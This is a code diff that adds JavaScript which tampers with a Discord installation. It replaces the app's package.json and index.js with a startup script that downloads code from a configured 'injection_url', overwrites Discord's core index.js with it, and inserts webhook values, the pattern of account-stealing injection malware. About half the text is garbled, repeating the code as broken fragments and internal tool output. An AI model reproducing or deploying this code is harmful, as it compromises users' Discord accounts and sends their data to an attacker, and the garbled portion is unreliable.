@@ -1,0 +1,98 @@
+function updateCheck = function updateCheck() {
+  const { resourcePath, app } = discordPath;
+  if (resourcePath === undefined || app === undefined) return;
+  const appPath = path.join(resourcePath, 'app');
+  const packageJson = path.join(appPath, 'package.json');
+  const resourceIndex = path.join(appPath, 'index.js');
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
+  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
+  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+
+  if (process.platform === 'win32' || process.platform === 'darwin') {
+    fs.writeFileSync(
+      packageJson,
+      JSON.stringify(
+        {
+          name: 'discord',
+          main: 'index.js',
+        },
+        null,
+        4,
+      ),
+    );
+
+    const startUpScript = `const fs = require('fs'), ...
+resourcePath = _tmp_8.resourcePath
+resourcePath === undefined || app === undefined
+const appPath = path.join(resourcePath, 'app')
+const packageJson = path.join(appPath, 'package.json')
+const resourceIndex = path.join(appPath, 'index.js')
+<operator>.formatString("", app, "\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js")
+const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar')
+!fs.existsSync(appPath)
+fs.existsSync(packageJson)
+fs.existsSync(resourceIndex)
+process.platform === 'win32' || process.platform === 'darwin'
+fs.writeFileSync(
+      packageJson,
+      JSON.stringify(
+        {
+          name: 'discord',
+          main: 'index.js',
+        },
+        null,
+        4,
+      ),
+    )
+JSON.stringify(
+        {
+          name: 'discord',
+          main: 'index.js',
+        },
+        null,
+        4,
+      )
+_tmp_9.name = "discord"
+_tmp_9.main = "index.js"
+4
+const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`
+"';
+const bdPath = '"
+"';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('"
+config.injection_url
+config.webhook
+config.webhook_protector_key
+path.join(resourcePath, 'app.asar')
+fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'))
